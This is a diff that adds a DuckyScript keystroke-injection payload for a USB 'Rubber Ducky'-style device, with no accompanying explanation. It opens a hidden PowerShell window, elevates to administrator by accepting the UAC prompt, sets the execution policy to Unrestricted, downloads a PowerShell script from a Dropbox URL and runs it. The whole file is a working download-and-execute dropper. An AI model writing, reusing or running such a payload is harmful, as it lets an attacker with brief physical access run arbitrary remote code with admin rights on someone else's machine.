@@ -1,0 +1,26 @@
+GUI d
+DELAY 100
+REM Start powershell as admin
+GUI r
+DELAY 500
+STRING PowerShell.exe -WindowStyle Hidden
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 500
+LEFT
+ENTER
+DELAY 500
+STRING cd C:\Users\Public
+ENTER
+DELAY 500
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 500
+STRING O
+ENTER
+DELAY 500
+STRING iwr -uri https://www.dropbox.com/s/aa31k7qnkcgf9h2/orgasm.ps1?dl=1 -OutFile orgasm.ps1
+ENTER
+DELAY 2000
+STRING .\orgasm.ps1
+ENTER
